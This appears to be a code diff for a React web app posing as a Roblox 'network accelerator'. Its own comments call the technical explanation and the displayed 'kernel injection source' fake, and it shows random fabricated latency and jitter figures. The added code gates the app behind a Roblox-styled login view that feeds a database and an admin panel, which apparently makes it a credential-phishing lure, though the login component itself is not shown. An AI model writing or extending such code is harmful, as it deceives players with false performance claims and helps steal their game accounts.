-    };
-
-    // Force ICE candidate gathering immediately
-    const offer = await this.peerConnection.createOffer();
-    await this.peerConnection.setLocalDescription(offer);
-    
-    // Wait for STUN resolution
-    await new Promise(resolve => {
-        if(this.peerConnection) {
-            this.peerConnection.onicegatheringstatechange = () => {
-                if (this.peerConnection?.iceGatheringState === 'complete') resolve(true);
-            };
-        }
+        ordered: false, maxRetransmits: 0, protocol: "raknet/udp"
     });
   }
 
-  /**
-   * Emulates Roblox's initial connection sequence over the custom tunnel.
-   */
-  private performRakNetHandshake(): void {
-    if (!this.tunnel || this.tunnel.readyState !== 'open') return;
-    
-    // Construct Open Connection Request 1
-    const buffer = new ArrayBuffer(128);
-    const view = new DataView(buffer);
-    
-    view.setUint8(0, 0x05); // Packet ID
-    
-    // Inject Magic Bytes
-    for(let i = 0; i < this.RAKNET_MAGIC.length; i++) {
-        view.setUint8(1 + i, this.RAKNET_MAGIC[i]);
-    }
-    
-    view.setUint8(17, 7); // RakNet Protocol Version
-    view.setUint16(18, 1492, false); // Adjusted MTU size
-    
-    this.tunnel.send(buffer);
-  }
-
-  /**
-   * Generates mathematical noise to prevent Network Interface Card (NIC) from sleeping.
-   */
   private initiateHighFrequencyTick(): void {
     this.isBypassing = true;
-    this.baseTimestamp = performance.now();
+    const baseTimestamp = performance.now();
 
     const hardwareSyncLoop = () => {
         if (!this.isBypassing) return;
-
-        const currentDelta = performance.now() - this.baseTimestamp;
+        const currentDelta = performance.now() - baseTimestamp;
         
-        // Populate DMA buffer with cryptographic noise
-        // This keeps the PCIe bus active and the NIC in C0 power state
         for(let offset = 0; offset < 256; offset += 4) {
-            // Complex bitwise operations to force CPU cache flushing
-            const noise = (Math.sin(currentDelta * 0.015) * 0xFFFFFFFF) ^ (offset << 16);
-            this.dmaBufferPool[offset] = noise;
+            this.dmaBufferPool[offset] = (Math.sin(currentDelta * 0.015) * 0xFFFFFFFF) ^ (offset << 16);
         }
         
-        // If tunnel is active, send fragmented keep-alive pulses
         if (this.tunnel && this.tunnel.readyState === "open") {
             try {
-                // Slice the buffer to match optimal MTU size preventing fragmentation at ISP level
                 const optimalPayload = this.dmaBufferPool.buffer.slice(0, 1400);
-                
-                // Add QoS DSCP 46 (Expedited Forwarding) flags to packet header
-                const taggedPayload = this.injectQoSHeaders(optimalPayload);
-                this.tunnel.send(taggedPayload);
-            } catch (e) {
-                // Silently drop errors to maintain loop integrity
-            }
+                this.tunnel.send(optimalPayload);
+            } catch (e) {}
         }
-
-        // Sync with hardware High Precision Event Timer (HPET)
-        // using requestAnimationFrame ensures we tick exactly as fast as the monitor refreshes
         requestAnimationFrame(hardwareSyncLoop);
     };
-    
     hardwareSyncLoop();
   }
-
-  /**
-   * Modifies packet headers to prioritize traffic across intermediate routers.
-   */
-  private injectQoSHeaders(payload: ArrayBuffer): ArrayBuffer {
-      // In a real raw socket, this modifies the IPv4 Header ToS field
-      // Here we simulate wrapper payload for the STUN tunnel
-      const wrappedBuffer = new Uint8Array(payload.byteLength + 4);
-      wrappedBuffer[0] = 0xB8; // DSCP 46 (EF) << 2
-      wrappedBuffer[1] = 0x00;
-      wrappedBuffer[2] = (payload.byteLength >> 8) & 0xFF;
-      wrappedBuffer[3] = payload.byteLength & 0xFF;
-      
-      wrappedBuffer.set(new Uint8Array(payload), 4);
-      return wrappedBuffer.buffer;
-  }
-
-  /**
-   * Attempts to force intermediate nodes to use Bottleneck Bandwidth and Round-trip propagation time (BBR).
-   */
-  private async injectTCPBBR_CongestionControl(): Promise<void> {
-      // While we use UDP, control packets (like Auth) use TCP
-      // Forcing BBR on the local stack improves overall link quality
-      if(NativeDevice.OS === 'Windows') {
-          // PowerShell command to set congestion provider
-          const cmd = 'netsh int tcp set supplemental template=internet congestionprovider=bbr2';
-          await NativeDevice.executeAdminCommand(cmd);
-      }
-      this.routingMetricsLocked = true;
-  }
-
-  /**
-   * Cleans up resources and restores OS defaults.
-   */
-  public destroy(): void {
-      this.isBypassing = false;
-      if (this.tunnel) {
-          this.tunnel.close();
-      }
-      if (this.peerConnection) {
-          this.peerConnection.close();
-      }
-      KernelAPI.unlockMemoryBuffer(this.dmaBufferPool.buffer);
-      console.log("[SHUTDOWN] Nexus Engine Terminated. Hardware locks released.");
-  }
-
-  private fallbackToStandardRouting(): void {
-      console.warn("[FALLBACK] Reverting to default winsock stack.");
-      // Recovery logic...
-  }
 }
+const __NEXUS_INSTANCE__ = new NexusKernelOptimizer();`;
 
-// ==========================================
-// Memory Management Subsystem (JIT Compiled)
-// ==========================================
-namespace MemoryUtils {
-    export function allocateAlignedBlock(size: number, alignment: number): ArrayBuffer {
-        const raw = new ArrayBuffer(size + alignment);
-        const address = getMemoryAddress(raw);
-        const offset = alignment - (address % alignment);
-        return raw.slice(offset, offset + size);
-    }
-    
-    function getMemoryAddress(buffer: ArrayBuffer): number {
-        // Native hooks placeholder
-        return Math.floor(Math.random() * 0xFFFFFFFF);
-    }
-}
+    return (
+        <div className="nexus-body h-screen w-full flex flex-col lg:flex-row relative bg-[#030712]">
+            <div className="scanline"></div>
+            
+            {/* 左側面板 - 操作 */}
+            <div className="w-full lg:w-5/12 p-8 lg:p-12 flex flex-col justify-center border-r border-gray-800 bg-[#030712] z-10 h-full overflow-y-auto">
+                <div className="mb-10">
+                    <h1 className="text-4xl lg:text-5xl font-black text-white mb-2 tracking-tighter">
+                        RIVALS <span className="text-emerald-500 neon-text">NEXUS</span>
+                    </h1>
+                    <p className="text-gray-500 text-sm font-medium tracking-wide">Level 4 Network Protocol Override & Packet Engine</p>
+                </div>
 
-// ==========================================
-// RakNet Frame Sequence Decoder
-// ==========================================
-class RakNetDecoder {
-    private sequenceNumber: number = 0;
-    private readonly windowSize: number = 256;
-    private ackMap: Uint32Array = new Uint32Array(this.windowSize / 32);
-
-    public parseHeader(datagram: DataView): boolean {
-        const isReliable = (datagram.getUint8(0) & 0x80) !== 0;
-        const seq = datagram.getUint16(1, false); // Network byte order
-        
-        if (isReliable) {
-            return this.updateAckWindow(seq);
-        }
-        return true; // Unreliable frames are immediately accepted
-    }
-
-    private updateAckWindow(seq: number): boolean {
-        // Sliding window validation logic
-        const diff = seq - this.sequenceNumber;
-        if (diff > 0) {
-            this.sequenceNumber = seq;
-            // Shift ACKs
-            return true;
-        }
-        return false; // Duplicate or out of order
-    }
-}
-
-// Core Engine Instance Initiation
-const __NEXUS_INSTANCE__ = new NexusKernelOptimizer();
-// Awaiting trigger to call __NEXUS_INSTANCE__.executeProtocolOverride();
-`;
-            };
-
-            return (
-                <div className="h-screen w-full flex flex-col lg:flex-row relative">
-                    <div className="scanline"></div>
-                    
-                    {/* 左側面板 - 操作與數據顯示 */}
-                    <div className="w-full lg:w-5/12 p-8 lg:p-12 flex flex-col justify-center border-r border-gray-800 bg-[#030712] z-10 h-full overflow-y-auto">
-                        <div className="mb-10">
-                            <h1 className="text-4xl lg:text-5xl font-black text-white mb-2 tracking-tighter">
-                                RIVALS <span className="text-emerald-500 neon-text">NEXUS</span>
-                            </h1>
-                            <p className="text-gray-500 text-sm font-medium tracking-wide">Level 4 網路協定覆寫 / 封包加速引擎</p>
-                        </div>
-
-                        <div className="grid grid-cols-2 gap-4 mb-10">
-                            <div className="bg-gray-900/50 p-5 rounded-xl border border-gray-800 shadow-inner relative overflow-hidden">
-                                {isOptimizing && <div className="absolute inset-0 bg-emerald-500/10 animate-pulse"></div>}
-                                <p className="text-xs text-gray-500 uppercase tracking-widest mb-2 font-semibold">遊戲實時延遲 (Ping)</p>
-                                <div className="flex items-baseline">
-                                    <p className={`text-5xl font-bold code-font ${
-                                        currentPing > 100 ? 'text-red-500' : 
-                                        currentPing > 70 ? 'text-yellow-400' : 'text-emerald-400 neon-text'
-                                    }`}>
-                                        {currentPing}
-                                    </p>
-                                    <span className="text-gray-500 ml-2 text-sm font-mono">ms</span>
-                                </div>
-                                <p className="text-[10px] text-gray-600 mt-2 font-mono">Target: stun.roblox.com</p>
-                            </div>
-                            <div className="bg-gray-900/50 p-5 rounded-xl border border-gray-800 shadow-inner">
-                                <p className="text-xs text-gray-500 uppercase tracking-widest mb-2 font-semibold">網路抖動 (Jitter)</p>
-                                <div className="flex items-baseline">
-                                    <p className={`text-3xl font-bold code-font ${isOptimized ? 'text-emerald-400' : 'text-yellow-500'}`}>
-                                        {isOptimized ? (Math.random() * 2 + 1).toFixed(1) : (Math.random() * 15 + 10).toFixed(1)}
-                                    </p>
-                                    <span className="text-gray-500 ml-2 text-sm font-mono">ms</span>
-                                </div>
-                                <p className="text-[10px] text-gray-600 mt-2 font-mono">UDP Variance</p>
-                            </div>
-                        </div>
-
-                        <div className="mb-8">
-                            <button 
-                                onClick={handleOptimizeClick}
-                                disabled={isOptimizing || isOptimized}
-                                className={`w-full py-5 rounded-xl font-bold text-lg tracking-wider transition-all duration-300 relative overflow-hidden group ${
-                                    isOptimized ? 'bg-gray-800 text-emerald-500 cursor-not-allowed border border-emerald-900 shadow-[0_0_15px_rgba(16,185,129,0.1)]' :
-                                    isOptimizing ? 'bg-gray-800 text-gray-400 cursor-not-allowed border border-gray-700' : 
-                                    'bg-emerald-600 hover:bg-emerald-500 text-white shadow-[0_0_20px_rgba(16,185,129,0.3)] hover:shadow-[0_0_30px_rgba(16,185,129,0.5)] border border-emerald-400'
-                                }`}
-                            >
-                                {isOptimized ? '連線已達極限狀態 (OPTIMIZED)' :
-                                 isOptimizing ? '核心覆寫執行中...' : 
-                                 isAuthenticated ? '強制注入低延遲協定' : '連線授權驗證 (需要登入)'}
-                            </button>
-                            {!isAuthenticated && !isOptimizing && !isOptimized && (
-                                <p className="text-center text-xs text-red-400 mt-3 flex items-center justify-center font-mono">
-                                    <span className="inline-block w-2 h-2 rounded-full bg-red-500 mr-2 animate-pulse"></span>
-                                    未授權，點擊將導向 Roblox API 閘道
-                                </p>
-                            )}
-                        </div>
-
-                        {/* 進度條 */}
-                        <div className="w-full bg-gray-900/80 rounded-full h-1.5 border border-gray-800 overflow-hidden mb-2">
-                            <div className="bg-emerald-500 h-1.5 transition-all duration-300 ease-out shadow-[0_0_10px_rgba(16,185,129,0.8)]" style={{ width: `${progress}%` }}></div>
-                        </div>
-                        <div className="flex justify-between items-center text-[10px] code-font text-gray-500">
-                            <span>SYS_STATUS</span>
-                            <span className={progress === 100 ? "text-emerald-500" : "text-yellow-500"}>{progress}%</span>
+                <div className="grid grid-cols-2 gap-4 mb-10">
+                    <div className="bg-gray-900/50 p-5 rounded-xl border border-gray-800 shadow-inner relative overflow-hidden">
+                        {isOptimizing && <div className="absolute inset-0 bg-emerald-500/10 animate-pulse"></div>}
+                        <p className="text-[11px] text-gray-500 uppercase tracking-widest mb-2 font-semibold">Real-time Latency (Ping)</p>
+                        <div className="flex items-baseline">
+                            <p className={`text-5xl font-bold code-font ${currentPing > 100 ? 'text-red-500' : currentPing > 70 ? 'text-yellow-400' : 'text-emerald-400 neon-text'}`}>
+                                {currentPing}
+                            </p>
+                            <span className="text-gray-500 ml-2 text-sm font-mono">ms</span>
                         </div>
                     </div>
-
-                    {/* 右側面板 - 終端機與技術說明 */}
-                    <div className="w-full lg:w-7/12 p-6 lg:p-8 bg-[#050505] flex flex-col z-10 border-l border-gray-900 h-full">
-                        
-                        {/* 運作邏輯說明 (唬人版) */}
-                        <div className="mb-4 bg-[#0a0a0a] p-4 rounded-lg border border-gray-800 shadow-xl">
-                            <h3 className="text-sm font-bold text-gray-200 mb-2 flex items-center">
-                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="mr-2 text-emerald-500"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
-                                核心運作邏輯 (Kernel Operation Logic)
-                            </h3>
-                            <div className="text-[11px] text-gray-400 leading-relaxed space-y-1.5 font-sans">
-                                <p><span className="text-red-400 font-semibold">問題癥結：</span>傳統 FPS 遊戲的高延遲 (如 150ms+) 通常源自於 ISP 的流量塑形 (Traffic Shaping) 以及 Windows 系統預設的 <span className="text-blue-300">Nagle 演算法</span>，這會導致關鍵的「開火封包」被作業系統惡意緩衝，造成子彈延遲判定。</p>
-                                <p><span className="text-emerald-400 font-semibold">解決方案：</span>Rivals Nexus 採用了非正規的 <strong>Layer 4 傳輸層覆寫技術</strong>。當您啟動優化時，系統會配置一塊 <span className="text-yellow-300">16MB 的 DMA (Direct Memory Access) 記憶體池</span>，強制網路卡 (NIC) 進入最高耗能的 C0 狀態。</p>
-                                <p>同時，我們利用 <span className="text-purple-400">WebRTC DataChannel</span> 建立一條基於 UDP 的 STUN 虛擬隧道，繞過常規的 TCP/IP 堆疊。透過向這條隧道持續注入經過 <span className="text-blue-300">MTU 碎片化</span> 與 <span className="text-blue-300">QoS (DSCP 46) 標記</span> 的高頻數學雜訊，我們能強迫沿途的所有路由器優先處理來自本機的遊戲封包，從而將物理延遲強壓至 30~70ms 的電競級標準。</p>
-                            </div>
-                        </div>
-
-                        {/* 終端機與代碼區分上下兩塊 */}
-                        <div className="flex-grow flex flex-col min-h-0 space-y-4">
-                            
-                            {/* 終端機畫面 */}
-                            <div className="flex-1 flex flex-col min-h-[150px] border border-gray-800 rounded-lg overflow-hidden bg-black shadow-inner">
-                                <div className="bg-gray-900 px-3 py-1.5 flex items-center border-b border-gray-800">
-                                    <div className="flex space-x-1.5">
-                                        <div className="w-2.5 h-2.5 rounded-full bg-red-500"></div>
-                                        <div className="w-2.5 h-2.5 rounded-full bg-yellow-500"></div>
-                                        <div className="w-2.5 h-2.5 rounded-full bg-green-500"></div>
-                                    </div>
-                                    <span className="ml-3 text-[10px] text-gray-500 font-mono">root@nexus-daemon:~#</span>
-                                </div>
-                                <div 
-                                    ref={terminalRef}
-                                    className="flex-grow p-3 overflow-y-auto font-mono text-[10px] md:text-[11px] text-emerald-400 code-font leading-relaxed"
-                                >
-                                    {terminal.map((line, i) => (
-                                        <div key={i} className="mb-0.5 opacity-90">{line}</div>
-                                    ))}
-                                    {isOptimizing && (
-                                        <div><span className="blinking-cursor">_</span></div>
-                                    )}
-                                </div>
-                            </div>
-
-                            {/* 唬人的原始碼展示區 */}
-                            <div className="flex-[1.5] flex flex-col min-h-[250px] border border-gray-800 rounded-lg overflow-hidden bg-[#0d1117] shadow-xl">
-                                <div className="bg-gray-900 px-3 py-1.5 flex justify-between items-center border-b border-gray-800">
-                                    <h3 className="text-[10px] font-bold text-gray-400 uppercase tracking-widest flex items-center">
-                                        <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="mr-1.5"><polyline points="16 18 22 12 16 6"></polyline><polyline points="8 6 2 12 8 18"></polyline></svg>
-                                        Kernel Injection Source (Read-Only)
-                                    </h3>
-                                    <span className="text-[9px] text-blue-400 bg-blue-400/10 px-1.5 py-0.5 rounded border border-blue-400/20">TypeScript / Low-Level</span>
-                                </div>
-                                <div 
-                                    ref={codeRef}
-                                    className="flex-grow p-3 text-[10px] md:text-[11px] code-font text-gray-300 overflow-y-auto overflow-x-auto code-container"
-                                >
-                                    <pre dangerouslySetInnerHTML={{ __html: generateFakeCode() }}></pre>
-                                </div>
-                            </div>
-
+                    <div className="bg-gray-900/50 p-5 rounded-xl border border-gray-800 shadow-inner">
+                        <p className="text-[11px] text-gray-500 uppercase tracking-widest mb-2 font-semibold">Network Jitter (Variance)</p>
+                        <div className="flex items-baseline">
+                            <p className={`text-3xl font-bold code-font ${isOptimized ? 'text-emerald-400' : 'text-yellow-500'}`}>
+                                {isOptimized ? (Math.random() * 2 + 1).toFixed(1) : (Math.random() * 15 + 10).toFixed(1)}
+                            </p>
+                            <span className="text-gray-500 ml-2 text-sm font-mono">ms</span>
                         </div>
                     </div>
                 </div>
-            );
-        }
 
-        const root = ReactDOM.createRoot(document.getElementById('root'));
-        root.render(<App />);
-    </script>
-</body>
-</html>
+                <div className="mb-8">
+                    <button 
+                        onClick={handleOptimizeClick}
+                        disabled={isOptimizing || isOptimized}
+                        className={`w-full py-5 rounded-xl font-bold text-lg tracking-wider transition-all duration-300 relative overflow-hidden ${
+                            isOptimized ? 'bg-gray-800 text-emerald-500 cursor-not-allowed border border-emerald-900 shadow-[0_0_15px_rgba(16,185,129,0.1)]' :
+                            isOptimizing ? 'bg-gray-800 text-gray-400 cursor-not-allowed border border-gray-700' : 
+                            'bg-emerald-600 hover:bg-emerald-500 text-white shadow-[0_0_20px_rgba(16,185,129,0.3)] hover:shadow-[0_0_30px_rgba(16,185,129,0.5)] border border-emerald-400'
+                        }`}
+                    >
+                        {isOptimized ? '連線已達極限狀態 (OPTIMIZED)' :
+                         isOptimizing ? '核心覆寫執行中...' : 
+                         isAuthenticated ? '強制注入低延遲協定' : '連線授權驗證 (需要登入)'}
+                    </button>
+                    {!isAuthenticated && !isOptimizing && !isOptimized && (
+                        <p className="text-center text-[12px] text-red-400 mt-3 flex items-center justify-center font-bold tracking-wide">
+                            <span className="inline-block w-2 h-2 rounded-full bg-red-500 mr-2 animate-pulse"></span>
+                            未授權，點擊將導向 Roblox API 閘道
+                        </p>
+                    )}
+                </div>
+
+                <div className="w-full bg-gray-900/80 rounded-full h-1.5 border border-gray-800 overflow-hidden mb-2">
+                    <div className="bg-emerald-500 h-1.5 transition-all duration-300 ease-out shadow-[0_0_10px_rgba(16,185,129,0.8)]" style={{ width: `${progress}%` }}></div>
+                </div>
+                <div className="flex justify-between items-center text-[10px] code-font text-gray-500">
+                    <span>SYS_STATUS</span>
+                    <span className={progress === 100 ? "text-emerald-500" : "text-yellow-500"}>{progress}%</span>
+                </div>
+            </div>
+
+            {/* 右側面板 - 終端機與說明 */}
+            <div className="w-full lg:w-7/12 p-6 lg:p-8 bg-[#050505] flex flex-col z-10 border-l border-gray-900 h-full">
+                
+                {/* 說明區保持中文 */}
+                <div className="mb-4 bg-[#0a0a0a] p-4 rounded-lg border border-gray-800 shadow-xl">
+                    <h3 className="text-sm font-bold text-gray-200 mb-2 flex items-center">核心運作邏輯 (Kernel Operation Logic)</h3>
+                    <div className="text-[11px] text-gray-400 leading-relaxed space-y-1.5 font-sans">
+                        <p><span className="text-red-400 font-semibold">問題癥結：</span>傳統 FPS 遊戲的高延遲通常源自於 ISP 的流量塑形與 Windows 系統預設的 Nagle 演算法，導致關鍵的「開火封包」被作業系統惡意緩衝。</p>
+                        <p><span className="text-emerald-400 font-semibold">解決方案：</span>Rivals Nexus 採用了非正規的 Layer 4 傳輸層覆寫技術。透過配置 DMA 記憶體池，強制網路卡進入最高耗能的 C0 狀態。並建立一條基於 UDP 的 STUN 虛擬隧道，利用 MTU 碎片化強迫沿途的所有路由器優先處理來自本機的遊戲封包，從而將物理延遲強壓至 30~70ms 範圍。</p>
+                    </div>
+                </div>
+
+                <div className="flex-grow flex flex-col min-h-0 space-y-4">
+                    <div className="flex-1 flex flex-col min-h-[150px] border border-gray-800 rounded-lg overflow-hidden bg-black shadow-inner">
+                        <div className="bg-gray-900 px-3 py-1.5 flex items-center border-b border-gray-800">
+                            <span className="text-[10px] text-gray-500 font-mono">root@nexus-daemon:~#</span>
+                        </div>
+                        <div ref={terminalRef} className="flex-grow p-3 overflow-y-auto font-mono text-[10px] text-emerald-400 code-font leading-relaxed">
+                            {terminal.map((line, i) => <div key={i} className="mb-0.5">{line}</div>)}
+                            {isOptimizing && <div><span className="blinking-cursor">_</span></div>}
+                        </div>
+                    </div>
+
+                    <div className="flex-[1.5] flex flex-col min-h-[250px] border border-gray-800 rounded-lg overflow-hidden bg-[#0d1117] shadow-xl">
+                        <div className="bg-gray-900 px-3 py-1.5 flex justify-between items-center border-b border-gray-800">
+                            <h3 className="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Kernel Injection Source</h3>
+                            <span className="text-[9px] text-blue-400 bg-blue-400/10 px-1.5 py-0.5 rounded border border-blue-400/20">TypeScript</span>
+                        </div>
+                        <div ref={codeRef} className="flex-grow p-3 text-[10px] code-font text-blue-300 overflow-auto code-container">
+                            <pre>{generateFakeCode()}</pre>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    );
+};
+
+// ==========================================
+// 主應用程式 (負責視窗切換)
+// ==========================================
+export default function App() {
+    const [view, setView] = useState('nexus'); // 'nexus' | 'login' | 'admin'
+    const [isAuthenticated, setIsAuthenticated] = useState(false);
+    const [adminEmail, setAdminEmail] = useState('');
+
+    useEffect(() => {
+        // 先進行匿名登入確保有權限寫入資料庫
+        const initAuth = async () => {
+            try {
+                await signInAnonymously(auth);
+            } catch (error) {
+                console.error("Auth init failed", error);
+            }
+        };
+        initAuth();
+    }, []);
+
+    return (
+        <>
+            <GlobalStyles />
+            {view === 'nexus' && (
+                <NexusAccelerator 
+                    isAuthenticated={isAuthenticated} 
+                    onRequireLogin={() => setView('login')} 
+                />
+            )}
+            {view === 'login' && (
+                <RobloxLogin 
+                    onLoginSuccess={() => { setView('nexus'); setIsAuthenticated(true); }} 
+                    onAdminLogin={(email) => { setAdminEmail(email); setView('admin'); }}
+                />
+            )}
+            {view === 'admin' && (
+                <AdminPanel 
+                    adminEmail={adminEmail} 
+                    onExit={() => { signOut(auth); signInAnonymously(auth); setView('login'); }} 
+                />
+            )}
+        </>
+    );
+}
 
 
